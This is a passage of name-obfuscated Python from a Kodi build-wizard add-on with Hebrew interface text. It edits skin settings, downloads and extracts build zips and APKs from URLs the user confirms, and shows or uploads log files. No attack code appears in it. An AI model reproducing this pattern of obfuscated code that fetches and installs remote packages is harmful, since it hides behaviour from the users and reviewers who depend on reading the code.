			O00000O0OO0OO0OO0 .close ()#line:4306
			OO00000O00O0O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4310
			O00000O0OO0OO0OO0 =open (OO00000O00O0O0OO0 ,'r')#line:4312
			O00O0000O0O00OO00 =O00000O0OO0OO0OO0 .read ()#line:4313
			O00000O0OO0OO0OO0 .close ()#line:4314
			O0OO00O0OO00O00O0 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4315
			O0OOO0OO0OOO0OO00 =re .compile (O0OO00O0OO00O00O0 ).findall (O00O0000O0O00OO00 )[0 ]#line:4316
			O00000O0OO0OO0OO0 =open (OO00000O00O0O0OO0 ,'w')#line:4317
			O00000O0OO0OO0OO0 .write (O00O0000O0O00OO00 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O0OOO0OO0OOO0OO00 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4318
			O00000O0OO0OO0OO0 .close ()#line:4319
			OO00000O00O0O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4323
			O00000O0OO0OO0OO0 =open (OO00000O00O0O0OO0 ,'r')#line:4325
			O00O0000O0O00OO00 =O00000O0OO0OO0OO0 .read ()#line:4326
			O00000O0OO0OO0OO0 .close ()#line:4327
			O0OO00O0OO00O00O0 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4328
			O0OOO0OO0OOO0OO00 =re .compile (O0OO00O0OO00O00O0 ).findall (O00O0000O0O00OO00 )[0 ]#line:4329
			O00000O0OO0OO0OO0 =open (OO00000O00O0O0OO0 ,'w')#line:4330
			O00000O0OO0OO0OO0 .write (O00O0000O0O00OO00 .replace ('<setting id="show.cdart" type="bool%s/setting>'%O0OOO0OO0OOO0OO00 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4331
			O00000O0OO0OO0OO0 .close ()#line:4332
			OO00000O00O0O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4336
			O00000O0OO0OO0OO0 =open (OO00000O00O0O0OO0 ,'r')#line:4338
			O00O0000O0O00OO00 =O00000O0OO0OO0OO0 .read ()#line:4339
			O00000O0OO0OO0OO0 .close ()#line:4340
			O0OO00O0OO00O00O0 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4341
			O0OOO0OO0OOO0OO00 =re .compile (O0OO00O0OO00O00O0 ).findall (O00O0000O0O00OO00 )[0 ]#line:4342
			O00000O0OO0OO0OO0 =open (OO00000O00O0O0OO0 ,'w')#line:4343
			O00000O0OO0OO0OO0 .write (O00O0000O0O00OO00 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O0OOO0OO0OOO0OO00 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4344
			O00000O0OO0OO0OO0 .close ()#line:4345
		except :#line:4350
			pass #line:4351
def thirdPartyInstall (OO0O0O000OOO0O00O ,O00OO00OO00OOOOO0 ):#line:4353
	if not wiz .workingURL (O00OO00OO00OOOOO0 ):#line:4354
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4355
	O000O00OOOOOOO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0O000OOO0O00O ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4356
	if O000O00OOOOOOO00O ==1 :#line:4357
		freshStart ('third',True )#line:4358
	wiz .clearS ('build')#line:4359
	OO0OO0OOOOO00OOOO =OO0O0O000OOO0O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4360
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4361
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O000OOO0O00O ),'','אנא המתן')#line:4362
	O0O000OO0OO0O0O0O =os .path .join (PACKAGES ,'%s.zip'%OO0OO0OOOOO00OOOO )#line:4363
	try :os .remove (O0O000OO0OO0O0O0O )#line:4364
	except :pass #line:4365
	downloader .download (O00OO00OO00OOOOO0 ,O0O000OO0OO0O0O0O ,DP )#line:4366
	xbmc .sleep (1000 )#line:4367
	OO00OOOO000000O0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O000OOO0O00O )#line:4368
	DP .update (0 ,OO00OOOO000000O0O ,'','אנא המתן')#line:4369
	O0O00O0O00OO0OOO0 ,O00O0O0O0OOO00OOO ,O000OO0OO0000O000 =extract .all (O0O000OO0OO0O0O0O ,HOME ,DP ,title =OO00OOOO000000O0O )#line:4370
	if int (float (O0O00O0O00OO0OOO0 ))>0 :#line:4371
		wiz .fixmetas ()#line:4372
		wiz .lookandFeelData ('save')#line:4373
		wiz .defaultSkin ()#line:4374
		wiz .setS ('installed','true')#line:4376
		wiz .setS ('extract',str (O0O00O0O00OO0OOO0 ))#line:4377
		wiz .setS ('errors',str (O00O0O0O0OOO00OOO ))#line:4378
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0O00O0O00OO0OOO0 ,O00O0O0O0OOO00OOO ))#line:4379
		try :os .remove (O0O000OO0OO0O0O0O )#line:4380
		except :pass #line:4381
		if int (float (O00O0O0O0OOO00OOO ))>0 :#line:4382
			OO0000OO00O00OOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O000OOO0O00O ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O00O0O00OO0OOO0 ,'%',COLOR1 ,O00O0O0O0OOO00OOO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4383
			if OO0000OO00O00OOOO :#line:4384
				if isinstance (O00O0O0O0OOO00OOO ,unicode ):#line:4385
					O000OO0OO0000O000 =O000OO0OO0000O000 .encode ('utf-8')#line:4386
				wiz .TextBox (ADDONTITLE ,O000OO0OO0000O000 )#line:4387
	DP .close ()#line:4388
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4389
	if INSTALLMETHOD ==1 :OO0000OOOOO0OOO0O =1 #line:4390
	elif INSTALLMETHOD ==2 :OO0000OOOOO0OOO0O =0 #line:4391
	else :OO0000OOOOO0OOO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4392
	if OO0000OOOOO0OOO0O ==1 :wiz .reloadFix ()#line:4393
	else :wiz .killxbmc (True )#line:4394
def testTheme (O00O00OOOO0OOO0OO ):#line:4396
	O0OO00O0OO00000O0 =zipfile .ZipFile (O00O00OOOO0OOO0OO )#line:4397
	for OOO0OOOOOO0OO0OO0 in O0OO00O0OO00000O0 .infolist ():#line:4398
		if '/settings.xml'in OOO0OOOOOO0OO0OO0 .filename :#line:4399
			return True #line:4400
	return False #line:4401
def testGui (O00O0O00000OOO0OO ):#line:4403
	OO0000O0OO0000O00 =zipfile .ZipFile (O00O0O00000OOO0OO )#line:4404
	for OO0O0O00O0000OOOO in OO0000O0OO0000O00 .infolist ():#line:4405
		if '/guisettings.xml'in OO0O0O00O0000OOOO .filename :#line:4406
			return True #line:4407
	return False #line:4408
def apkInstaller (O0OOO0000OOOO00OO ,OOOOO00OOO000OO0O ):#line:4410
	wiz .log (O0OOO0000OOOO00OO )#line:4411
	wiz .log (OOOOO00OOO000OO0O )#line:4412
	if wiz .platform ()=='android':#line:4413
		O00OOOOOO00O0O00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0000OOOO00OO ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4414
		if not O00OOOOOO00O0O00O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4415
		OOO0O00O00O000OO0 =O0OOO0000OOOO00OO #line:4416
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4417
		if not wiz .workingURL (OOOOO00OOO000OO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4418
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O00O00O000OO0 ),'','אנא המתן')#line:4419
		OO000O0O00OO0O00O =os .path .join (PACKAGES ,"%s.apk"%O0OOO0000OOOO00OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4420
		try :os .remove (OO000O0O00OO0O00O )#line:4421
		except :pass #line:4422
		downloader .download (OOOOO00OOO000OO0O ,OO000O0O00OO0O00O ,DP )#line:4423
		xbmc .sleep (100 )#line:4424
		DP .close ()#line:4425
		notify .apkInstaller (O0OOO0000OOOO00OO )#line:4426
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO000O0O00OO0O00O +'")')#line:4427
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4428
def createMenu (O000O00O0OOO0OO0O ,OO0O0OO0O00OO0OOO ,O0OOOOOO000OOOOOO ):#line:4434
	if O000O00O0OOO0OO0O =='saveaddon':#line:4435
		OO0OO0OO000000OO0 =[]#line:4436
		OO0O00000O00OOOOO =urllib .quote_plus (OO0O0OO0O00OO0OOO .lower ().replace (' ',''))#line:4437
		OO0OOOO00O00O0OOO =OO0O0OO0O00OO0OOO .replace ('Debrid','Real Debrid')#line:4438
		O0OO0OOOOO0OOOO00 =urllib .quote_plus (O0OOOOOO000OOOOOO .lower ().replace (' ',''))#line:4439
		O0OOOOOO000OOOOOO =O0OOOOOO000OOOOOO .replace ('url','URL Resolver')#line:4440
		OO0OO0OO000000OO0 .append ((THEME2 %O0OOOOOO000OOOOOO .title (),' '))#line:4441
		OO0OO0OO000000OO0 .append ((THEME3 %'Save %s Data'%OO0OOOO00O00O0OOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO0O00000O00OOOOO ,O0OO0OOOOO0OOOO00 )))#line:4442
		OO0OO0OO000000OO0 .append ((THEME3 %'Restore %s Data'%OO0OOOO00O00O0OOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO0O00000O00OOOOO ,O0OO0OOOOO0OOOO00 )))#line:4443
		OO0OO0OO000000OO0 .append ((THEME3 %'Clear %s Data'%OO0OOOO00O00O0OOO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OO0O00000O00OOOOO ,O0OO0OOOOO0OOOO00 )))#line:4444
	elif O000O00O0OOO0OO0O =='save':#line:4445
		OO0OO0OO000000OO0 =[]#line:4446
		OO0O00000O00OOOOO =urllib .quote_plus (OO0O0OO0O00OO0OOO .lower ().replace (' ',''))#line:4447
		OO0OOOO00O00O0OOO =OO0O0OO0O00OO0OOO .replace ('Debrid','Real Debrid')#line:4448
		O0OO0OOOOO0OOOO00 =urllib .quote_plus (O0OOOOOO000OOOOOO .lower ().replace (' ',''))#line:4449
		O0OOOOOO000OOOOOO =O0OOOOOO000OOOOOO .replace ('url','URL Resolver')#line:4450
		OO0OO0OO000000OO0 .append ((THEME2 %O0OOOOOO000OOOOOO .title (),' '))#line:4451
		OO0OO0OO000000OO0 .append ((THEME3 %'Register %s'%OO0OOOO00O00O0OOO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OO0O00000O00OOOOO ,O0OO0OOOOO0OOOO00 )))#line:4452
		OO0OO0OO000000OO0 .append ((THEME3 %'Save %s Data'%OO0OOOO00O00O0OOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO0O00000O00OOOOO ,O0OO0OOOOO0OOOO00 )))#line:4453
		OO0OO0OO000000OO0 .append ((THEME3 %'Restore %s Data'%OO0OOOO00O00O0OOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO0O00000O00OOOOO ,O0OO0OOOOO0OOOO00 )))#line:4454
		OO0OO0OO000000OO0 .append ((THEME3 %'Import %s Data'%OO0OOOO00O00O0OOO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OO0O00000O00OOOOO ,O0OO0OOOOO0OOOO00 )))#line:4455
		OO0OO0OO000000OO0 .append ((THEME3 %'Clear Addon %s Data'%OO0OOOO00O00O0OOO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OO0O00000O00OOOOO ,O0OO0OOOOO0OOOO00 )))#line:4456
	elif O000O00O0OOO0OO0O =='install':#line:4457
		OO0OO0OO000000OO0 =[]#line:4458
		O0OO0OOOOO0OOOO00 =urllib .quote_plus (O0OOOOOO000OOOOOO )#line:4459
		OO0OO0OO000000OO0 .append ((THEME2 %O0OOOOOO000OOOOOO ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0OO0OOOOO0OOOO00 )))#line:4460
		OO0OO0OO000000OO0 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0OO0OOOOO0OOOO00 )))#line:4461
		OO0OO0OO000000OO0 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0OO0OOOOO0OOOO00 )))#line:4462
		OO0OO0OO000000OO0 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0OO0OOOOO0OOOO00 )))#line:4463
		OO0OO0OO000000OO0 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0OO0OOOOO0OOOO00 )))#line:4464
	OO0OO0OO000000OO0 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4465
	return OO0OO0OO000000OO0 #line:4466
def toggleCache (O00O000OOOO0O000O ):#line:4468
	OO0000O0O0000000O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4469
	O000OOO0O00000000 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4470
	if O00O000OOOO0O000O in ['true','false']:#line:4471
		for O0O000000OO0O0O00 in OO0000O0O0000000O :#line:4472
			wiz .setS (O0O000000OO0O0O00 ,O00O000OOOO0O000O )#line:4473
	else :#line:4474
		if not O00O000OOOO0O000O in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4475
			try :#line:4476
				O0O000000OO0O0O00 =O000OOO0O00000000 [OO0000O0O0000000O .index (O00O000OOOO0O000O )]#line:4477
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O0O000000OO0O0O00 ))#line:4478
			except :#line:4479
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O00O000OOOO0O000O ))#line:4480
		else :#line:4481
			OOOOOO0O0OO00O0OO ='true'if wiz .getS (O00O000OOOO0O000O )=='false'else 'false'#line:4482
			wiz .setS (O00O000OOOO0O000O ,OOOOOO0O0OO00O0OO )#line:4483
def playVideo (O000OOOOO00O0OOOO ):#line:4485
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O000OOOOO00O0OOOO )#line:4486
	if 'watch?v='in O000OOOOO00O0OOOO :#line:4487
		OOOOOO0O0OO0O000O ,O0OOOO0000000OO0O =O000OOOOO00O0OOOO .split ('?')#line:4488
		O00O0O0O00OO0O0O0 =O0OOOO0000000OO0O .split ('&')#line:4489
		for OO00O0000000O0OOO in O00O0O0O00OO0O0O0 :#line:4490
			if OO00O0000000O0OOO .startswith ('v='):#line:4491
				O000OOOOO00O0OOOO =OO00O0000000O0OOO [2 :]#line:4492
				break #line:4493
			else :continue #line:4494
	elif 'embed'in O000OOOOO00O0OOOO or 'youtu.be'in O000OOOOO00O0OOOO :#line:4495
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O000OOOOO00O0OOOO )#line:4496
		OOOOOO0O0OO0O000O =O000OOOOO00O0OOOO .split ('/')#line:4497
		if len (OOOOOO0O0OO0O000O [-1 ])>5 :#line:4498
			O000OOOOO00O0OOOO =OOOOOO0O0OO0O000O [-1 ]#line:4499
		elif len (OOOOOO0O0OO0O000O [-2 ])>5 :#line:4500
			O000OOOOO00O0OOOO =OOOOOO0O0OO0O000O [-2 ]#line:4501
	wiz .log ("YouTube URL: %s"%O000OOOOO00O0OOOO )#line:4502
	yt .PlayVideo (O000OOOOO00O0OOOO )#line:4503
def viewLogFile ():#line:4505
	O0OOO000O000OO0OO =wiz .Grab_Log (True )#line:4506
	OO000O0OO0000O0O0 =wiz .Grab_Log (True ,True )#line:4507
	O00OOOOOO00O0O0OO =0 ;OOOO00O00000OOOO0 =O0OOO000O000OO0OO #line:4508
	if not OO000O0OO0000O0O0 ==False and not O0OOO000O000OO0OO ==False :#line:4509
		O00OOOOOO00O0O0OO =DIALOG .select (ADDONTITLE ,["View %s"%O0OOO000O000OO0OO .replace (LOG ,""),"View %s"%OO000O0OO0000O0O0 .replace (LOG ,"")])#line:4510
		if O00OOOOOO00O0O0OO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4511
	elif O0OOO000O000OO0OO ==False and OO000O0OO0000O0O0 ==False :#line:4512
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4513
		return #line:4514
	elif not O0OOO000O000OO0OO ==False :O00OOOOOO00O0O0OO =0 #line:4515
	elif not OO000O0OO0000O0O0 ==False :O00OOOOOO00O0O0OO =1 #line:4516
	OOOO00O00000OOOO0 =O0OOO000O000OO0OO if O00OOOOOO00O0O0OO ==0 else OO000O0OO0000O0O0 #line:4518
	O0OO0OO0O00000OOO =wiz .Grab_Log (False )if O00OOOOOO00O0O0OO ==0 else wiz .Grab_Log (False ,True )#line:4519
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OOOO00O00000OOOO0 ),O0OO0OO0O00000OOO )#line:4521
def errorChecking (log =None ,count =None ,all =None ):#line:4523
	if log ==None :#line:4524
		O0O0OOOO00O0000OO =wiz .Grab_Log (True )#line:4525
		OO0000OO0OOOO0O0O =wiz .Grab_Log (True ,True )#line:4526
		if not OO0000OO0OOOO0O0O ==False and not O0O0OOOO00O0000OO ==False :#line:4527
			OO0OO0OOOO0000OOO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0O0OOOO00O0000OO .replace (LOG ,""),errorChecking (O0O0OOOO00O0000OO ,True ,True )),"View %s: %s error(s)"%(OO0000OO0OOOO0O0O .replace (LOG ,""),errorChecking (OO0000OO0OOOO0O0O ,True ,True ))])#line:4528
			if OO0OO0OOOO0000OOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4529
		elif O0O0OOOO00O0000OO ==False and OO0000OO0OOOO0O0O ==False :#line:4530
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4531
			return #line:4532
		elif not O0O0OOOO00O0000OO ==False :OO0OO0OOOO0000OOO =0 #line:4533
		elif not OO0000OO0OOOO0O0O ==False :OO0OO0OOOO0000OOO =1 #line:4534
		log =O0O0OOOO00O0000OO if OO0OO0OOOO0000OOO ==0 else OO0000OO0OOOO0O0O #line:4535
	if log ==False :#line:4536
		if count ==None :#line:4537
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4538
			return False #line:4539
		else :#line:4540
			return 0 #line:4541
	else :#line:4542
		if os .path .exists (log ):#line:4543
			OOOO0O00000O00O0O =open (log ,mode ='r');O00O00OO0OO0OOOOO =OOOO0O00000O00O0O .read ().replace ('\n','').replace ('\r','');OOOO0O00000O00O0O .close ()#line:4544
			O0000OOOOO0OOO0O0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O00O00OO0OO0OOOOO )#line:4545
			if not count ==None :#line:4546
				if all ==None :#line:4547
					OO0OO0O0O0O0O000O =0 #line:4548
					for O000O0OO00O00OOO0 in O0000OOOOO0OOO0O0 :#line:4549
						if ADDON_ID in O000O0OO00O00OOO0 :OO0OO0O0O0O0O000O +=1 #line:4550
					return OO0OO0O0O0O0O000O #line:4551
				else :return len (O0000OOOOO0OOO0O0 )#line:4552
			if len (O0000OOOOO0OOO0O0 )>0 :#line:4553
				OO0OO0O0O0O0O000O =0 ;O00OO0O0O0O0000O0 =""#line:4554
				for O000O0OO00O00OOO0 in O0000OOOOO0OOO0O0 :#line:4555
					if all ==None and not ADDON_ID in O000O0OO00O00OOO0 :continue #line:4556
					else :#line:4557
						OO0OO0O0O0O0O000O +=1 #line:4558
						O00OO0O0O0O0000O0 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OO0OO0O0O0O0O000O ,O000O0OO00O00OOO0 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4559
				if OO0OO0O0O0O0O000O >0 :#line:4560
					wiz .TextBox (ADDONTITLE ,O00OO0O0O0O0000O0 )#line:4561
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4562
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4563
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4564
ACTION_PREVIOUS_MENU =10 #line:4566
ACTION_NAV_BACK =92 #line:4567
ACTION_MOVE_LEFT =1 #line:4568
ACTION_MOVE_RIGHT =2 #line:4569
ACTION_MOVE_UP =3 #line:4570
ACTION_MOVE_DOWN =4 #line:4571
ACTION_MOUSE_WHEEL_UP =104 #line:4572
ACTION_MOUSE_WHEEL_DOWN =105 #line:4573
ACTION_MOVE_MOUSE =107 #line:4574
ACTION_SELECT_ITEM =7 #line:4575
ACTION_BACKSPACE =110 #line:4576
ACTION_MOUSE_LEFT_CLICK =100 #line:4577
ACTION_MOUSE_LONG_CLICK =108 #line:4578
def LogViewer (default =None ):#line:4580
	class OOOOOOOOO0O0OO00O (xbmcgui .WindowXMLDialog ):#line:4581
		def __init__ (O0O0O0OO0OOOOOOO0 ,*OOOO0O0OOO000O0OO ,**O0OO0O00OO0OO00OO ):#line:4582
			O0O0O0OO0OOOOOOO0 .default =O0OO0O00OO0OO00OO ['default']#line:4583
		def onInit (OOOO00OO0OOO0O000 ):#line:4585
			OOOO00OO0OOO0O000 .title =101 #line:4586
			OOOO00OO0OOO0O000 .msg =102 #line:4587
			OOOO00OO0OOO0O000 .scrollbar =103 #line:4588
			OOOO00OO0OOO0O000 .upload =201 #line:4589
			OOOO00OO0OOO0O000 .kodi =202 #line:4590
			OOOO00OO0OOO0O000 .kodiold =203 #line:4591
			OOOO00OO0OOO0O000 .wizard =204 #line:4592
			OOOO00OO0OOO0O000 .okbutton =205 #line:4593
			OOOO0000O0OOOO00O =open (OOOO00OO0OOO0O000 .default ,'r')#line:4594
			OOOO00OO0OOO0O000 .logmsg =OOOO0000O0OOOO00O .read ()#line:4595
			OOOO0000O0OOOO00O .close ()#line:4596
			OOOO00OO0OOO0O000 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO00OO0OOO0O000 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4597
			OOOO00OO0OOO0O000 .showdialog ()#line:4598
		def showdialog (O000OO0OOOO000OOO ):#line:4600
			O000OO0OOOO000OOO .getControl (O000OO0OOOO000OOO .title ).setLabel (O000OO0OOOO000OOO .titlemsg )#line:4601
			O000OO0OOOO000OOO .getControl (O000OO0OOOO000OOO .msg ).setText (wiz .highlightText (O000OO0OOOO000OOO .logmsg ))#line:4602
			O000OO0OOOO000OOO .setFocusId (O000OO0OOOO000OOO .scrollbar )#line:4603
		def onClick (OOOOO0000OOOO0OOO ,OOO00O00O0O0OOOOO ):#line:4605
			if OOO00O00O0O0OOOOO ==OOOOO0000OOOO0OOO .okbutton :OOOOO0000OOOO0OOO .close ()#line:4606
			elif OOO00O00O0O0OOOOO ==OOOOO0000OOOO0OOO .upload :OOOOO0000OOOO0OOO .close ();uploadLog .Main ()#line:4607
			elif OOO00O00O0O0OOOOO ==OOOOO0000OOOO0OOO .kodi :#line:4608
				O0O00O00OO0O0OOOO =wiz .Grab_Log (False )#line:4609
				O0OO00O0OOO00OO0O =wiz .Grab_Log (True )#line:4610
				if O0O00O00OO0O0OOOO ==False :#line:4611
					OOOOO0000OOOO0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4612
					OOOOO0000OOOO0OOO .getControl (OOOOO0000OOOO0OOO .msg ).setText ("Log File Does Not Exists!")#line:4613
				else :#line:4614
					OOOOO0000OOOO0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O0OO00O0OOO00OO0O .replace (LOG ,''))#line:4615
					OOOOO0000OOOO0OOO .getControl (OOOOO0000OOOO0OOO .title ).setLabel (OOOOO0000OOOO0OOO .titlemsg )#line:4616
					OOOOO0000OOOO0OOO .getControl (OOOOO0000OOOO0OOO .msg ).setText (wiz .highlightText (O0O00O00OO0O0OOOO ))#line:4617
					OOOOO0000OOOO0OOO .setFocusId (OOOOO0000OOOO0OOO .scrollbar )#line:4618
			elif OOO00O00O0O0OOOOO ==OOOOO0000OOOO0OOO .kodiold :#line:4619
				O0O00O00OO0O0OOOO =wiz .Grab_Log (False ,True )#line:4620
				O0OO00O0OOO00OO0O =wiz .Grab_Log (True ,True )#line:4621
				if O0O00O00OO0O0OOOO ==False :#line:4622
					OOOOO0000OOOO0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4623
					OOOOO0000OOOO0OOO .getControl (OOOOO0000OOOO0OOO .msg ).setText ("Log File Does Not Exists!")#line:4624
				else :#line:4625
					OOOOO0000OOOO0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O0OO00O0OOO00OO0O .replace (LOG ,''))#line:4626
					OOOOO0000OOOO0OOO .getControl (OOOOO0000OOOO0OOO .title ).setLabel (OOOOO0000OOOO0OOO .titlemsg )#line:4627
					OOOOO0000OOOO0OOO .getControl (OOOOO0000OOOO0OOO .msg ).setText (wiz .highlightText (O0O00O00OO0O0OOOO ))#line:4628
					OOOOO0000OOOO0OOO .setFocusId (OOOOO0000OOOO0OOO .scrollbar )#line:4629
			elif OOO00O00O0O0OOOOO ==OOOOO0000OOOO0OOO .wizard :#line:4630
				O0O00O00OO0O0OOOO =wiz .Grab_Log (False ,False ,True )#line:4631
				O0OO00O0OOO00OO0O =wiz .Grab_Log (True ,False ,True )#line:4632
				if O0O00O00OO0O0OOOO ==False :#line:4633
					OOOOO0000OOOO0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4634
					OOOOO0000OOOO0OOO .getControl (OOOOO0000OOOO0OOO .msg ).setText ("Log File Does Not Exists!")#line:4635
				else :#line:4636
					OOOOO0000OOOO0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O0OO00O0OOO00OO0O .replace (ADDONDATA ,''))#line:4637
					OOOOO0000OOOO0OOO .getControl (OOOOO0000OOOO0OOO .title ).setLabel (OOOOO0000OOOO0OOO .titlemsg )#line:4638
					OOOOO0000OOOO0OOO .getControl (OOOOO0000OOOO0OOO .msg ).setText (wiz .highlightText (O0O00O00OO0O0OOOO ))#line:4639
					OOOOO0000OOOO0OOO .setFocusId (OOOOO0000OOOO0OOO .scrollbar )#line:4640
